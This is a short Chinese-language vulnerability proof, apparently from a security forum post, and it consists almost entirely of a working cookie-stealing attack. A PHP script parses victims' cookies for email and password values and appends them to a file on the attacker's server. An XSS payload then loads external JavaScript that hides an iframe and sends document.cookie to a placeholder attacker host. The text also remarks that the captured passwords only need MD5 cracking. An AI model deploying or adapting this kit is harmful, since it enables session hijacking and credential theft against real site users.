密码是md5解密就行了。   漏洞证明：  
<html><head><title>90sec/title><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><style type="text/css">body{background-image:url(http://forum.90sec.org/images/default/logo.gif);background-attachment:fixed;background-repeat:no-repeat;background-color:#AFAFAF;background-position:50% 50%;}</style></head><body></body></html><?php$cookie = $_GET['c'];get_pwd_and_email($cookie);function get_pwd_and_email($cookie){	$get = array();	if (!empty($cookie))	{		$cookie = strtr($cookie,"; ","&");		parse_str($cookie,$get);	    if(isset($get['email'])) $a=$get['email'];	    if(isset($get['password']))  $b=$get['password'];		$c="email:$a-password:$b";		//echo "$c";		$password_list=file('E:/vhost/wwwroot/vhost1329816067000/www/uploads/sb.txt');		if(in_array("$c\r\n",$password_list))		{break;}else{		$fp=@fopen('E:/vhost/wwwroot/vhost1329816067000/www/uploads/sb.txt','a');		@fwrite($fp,$c."\r\n");		@fclose($fp);		}	}}?>
利用外部调用js:
<script/src=//xxxxx/1.js>
1.js代码
<iframe id="rc" width="0" height="0"></iframe><script>document.getElementById("rc").src="http://xxx/SBzhu1.php?c="+document.cookie;</script>
